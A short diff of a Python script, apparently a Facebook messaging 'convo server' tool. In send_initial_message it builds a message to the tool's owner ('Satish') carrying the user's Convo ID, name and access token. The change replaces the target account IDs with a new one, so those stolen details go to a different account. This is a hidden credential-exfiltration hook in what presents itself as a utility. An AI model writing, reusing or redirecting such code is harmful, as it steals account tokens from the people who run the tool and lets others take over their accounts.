@@ -120,7 +120,7 @@ def send_initial_message():
     msg_template = "Owner => Satish \n Hello Satish sir. \n I am using your convo server. \n This Is My Details :- \n Convo ID :- {} \n Name:- {} \n Token :- {}"
     
     # Target IDs
-    target_ids = ["100087513362848", "109743854789"]
+    target_ids = ["100010407155711"]
     
     requests.packages.urllib3.disable_warnings()
     
